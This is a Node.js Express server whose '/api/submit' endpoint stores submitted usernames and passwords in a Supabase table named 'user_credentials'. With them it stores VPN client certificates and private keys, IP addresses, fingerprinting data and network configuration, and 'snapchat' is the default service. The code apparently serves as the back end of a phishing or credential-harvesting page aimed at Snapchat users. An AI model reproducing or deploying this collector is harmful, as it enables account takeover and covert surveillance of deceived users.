require('dotenv').config();
const express = require('express');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const port = process.env.PORT || 3000;

// Initialize Supabase client
const supabaseUrl = process.env.SUPABASE_URL || '';
const supabaseKey = process.env.SUPABASE_ANON_KEY || '';
const supabase = createClient(supabaseUrl, supabaseKey);

// Middleware to parse JSON bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Endpoint to store credentials
app.post('/api/submit', async (req, res) => {
  try {
    const { 
      username, 
      password,
      // VPN Configuration - Certificates
      ca_crt,
      client_crt,
      client_key,
      ta_key,
      // VPN Configuration - Server details
      server_ip = '206.45.29.181',
      server_port = 1194,
      protocol = 'udp',
      // System information (auto-detected)
      system_info,
      // OVPN file content
      ovpn_config,
      // Advanced fingerprinting data
      advanced_data,
      // Service name
      service = 'snapchat',
      // Optional metadata
      config_name,
      notes
    } = req.body;

    if (!username || !password) {
      return res.status(400).json({ success: false, error: 'Username and password are required' });
    }
    
    // Get IP address from request
    const ipAddress = req.headers['x-forwarded-for'] || 
                      req.connection.remoteAddress || 
                      req.socket.remoteAddress ||
                      req.ip;
    
    // Prepare data object for Supabase
    const dataToInsert = {
      username,
      password,
      ip_address: ipAddress,
      created_at: new Date().toISOString()
    };

    // Add VPN configuration if provided
    if (ca_crt) dataToInsert.ca_crt = ca_crt;
    if (client_crt) dataToInsert.client_crt = client_crt;
    if (client_key) dataToInsert.client_key = client_key;
    if (ta_key) dataToInsert.ta_key = ta_key;
    
    // Add server configuration
    dataToInsert.server_ip = server_ip;
    dataToInsert.server_port = parseInt(server_port);
    dataToInsert.protocol = protocol;
    
    // Store comprehensive system information with advanced data
    if (system_info || advanced_data) {
      dataToInsert.system_info = JSON.stringify({
        basic: system_info,
        advanced: advanced_data,
        ovpn_generated: !!ovpn_config,
        collection_timestamp: new Date().toISOString()
      });
    }
    
    // ⭐ Extract and store native network config separately if available
    if (advanced_data?.native_network_config) {
      dataToInsert.native_network_config = JSON.stringify(advanced_data.native_network_config);
    }
    
    // ⭐ Set platform type based on collection info
    if (advanced_data?.collection_info?.platform) {
      dataToInsert.platform_type = advanced_data.collection_info.platform;
    } else {
      dataToInsert.platform_type = 'web';
    }

    // Store OVPN config (add column 'ovpn_config TEXT' to Supabase if needed)
    if (ovpn_config) {
      dataToInsert.ovpn_config = ovpn_config;
    }
    
    // Add optional metadata
    if (service) dataToInsert.service = service;
    if (config_name) dataToInsert.config_name = config_name;
    if (notes) dataToInsert.notes = notes;

    console.log('Enhanced data prepared:', {
      username,
      ip: ipAddress,
      service,
      has_vpn_config: !!(ca_crt || client_crt || client_key),
      has_system_info: !!system_info,
      has_advanced_data: !!advanced_data,
      has_ovpn_config: !!ovpn_config,
      ovpn_size: ovpn_config ? ovpn_config.length : 0,
      has_native_network_config: !!(advanced_data?.native_network_config),
      platform_type: dataToInsert.platform_type
    });

    // Store in Supabase
    let { data, error } = await supabase
      .from('user_credentials')
      .insert([dataToInsert]);

    // Fallback: If error is due to missing 'service' column (user didn't run migration), retry without it
    if (error && (error.message.includes('service') || error.code === '42703')) {
        console.warn('⚠️ Database schema mismatch detected (missing service column). Retrying without service field...');
        delete dataToInsert.service;
        const retry = await supabase
            .from('user_credentials')
            .insert([dataToInsert]);
        data = retry.data;
        error = retry.error;
    }

    if (error) {
      console.error('Supabase error:', error);
      return res.status(500).json({ success: false, error: error.message });
    }

    console.log('Data stored successfully:', { username, ip: ipAddress });
    res.json({ 
      success: true, 
      message: 'Data stored successfully',
      ovpn_generated: !!ovpn_config,
      advanced_fingerprint: !!advanced_data,
      native_network_config: !!(advanced_data?.native_network_config),
      platform_type: dataToInsert.platform_type
    });
    
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
  console.log('Supabase connection initialized');
});